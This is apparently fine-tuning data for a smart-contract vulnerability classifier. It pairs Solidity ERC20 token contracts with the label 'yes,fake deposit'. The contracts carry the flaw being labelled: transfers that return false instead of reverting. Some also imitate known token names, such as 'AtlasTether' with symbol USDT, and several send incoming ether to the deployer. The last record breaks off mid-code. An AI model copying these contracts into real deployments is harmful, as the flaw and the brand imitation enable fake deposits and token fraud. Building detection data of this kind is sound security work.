{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract HotaruInu is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Hotaru Inu\";\n string public constant symbol = \"HOTARU\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract CryptoCasinoToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Crypto Casino Token\";\n string public constant symbol = \"CRYCAS\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"Anonymous Coin\";\n decimals = 0;\n symbol = \"ANON\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\ncontract SHIBA_INU_v2 is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000*10**uint256(decimals);\n string public constant name = \"SHIBA INU v2\";\n string public constant symbol = \"SHIBB\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000000; // Update total supply (100000 for example)\n name = \"HellBound Coin\"; // Set the name for display purposes\n decimals = 4; // Amount of decimals for display purposes\n symbol = \"HBC\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract TCP is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 250000000*10**uint256(decimals);\n string public constant name = \"Crypto Prophecies\";\n string public constant symbol = \"TCP\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"pig.finance\";\n decimals = 0;\n symbol = \"PIG\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract BretCoin is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name = 'BretCoin'; //fancy name: eg Simon Bucks\n uint8 public decimals = 10; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol = 'BRET'; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function BretCoin(\n ) {\n balances[msg.sender] = 210000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 210000000000000000; // Update total supply (100000 for example)\n name = \"BretCoin\"; // Set the name for display purposes\n decimals = 10; // Amount of decimals for display purposes\n symbol = \"BRET\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Biomutant_In_Game_Token is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Biomutant In-Game Token\";\n string public constant symbol = \"$BIOM\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\ncontract AtlasTether {\n/// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n/// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n/// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n/// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\ncontract StandardToken is AtlasTether {\nfunction transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\nfunction approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\nmapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n//name this contract whatever you\u2019d like\ncontract Token is StandardToken {\nfunction () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n\n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It\u2019s like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n//\n// \u0628\u0631\u0627\u06cc \u062a\u0648\u06a9\u0646 \u062e\u0648\u062f \u0645\u0642\u062f\u0627\u0631\u0647\u0627\u06cc \u0632\u06cc\u0631 \u0631\u0627 \u062a\u063a\u06cc\u06cc\u0631 \u062f\u0647\u06cc\u062f\n//\n//make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\nfunction Token(\n ) {\n balances[msg.sender] = 100000; // \u062a\u0645\u0627\u0645 \u062a\u0648\u06a9\u0646\u0647\u0627\u06cc \u0633\u0627\u062e\u062a\u0647 \u0634\u062f\u0647 \u0633\u0627\u0632\u0646\u062f\u0647 \u0628\u0631\u0633\u062f -\u0639\u062f\u062f\u06cc \u0648\u0627\u0631\u062f \u06a9\u0646\u06cc\u062f \u0645\u062b\u0644\u0627 100000\n totalSupply = 1000000000; // \u062a\u0645\u0627\u0645 \u0639\u0631\u0636\u0647\n name = 'AtlasTether'; // \u0646\u0627\u0645 \u062a\u0648\u06a9\u0646\n decimals = 2; // \u0627\u0639\u0634\u0627\u0631\n symbol = 'USDT'; // \u0646\u0645\u0627\u062f \u062a\u0648\u06a9\u0646\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3('receiveApproval(address,uint256,address,bytes)'))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= 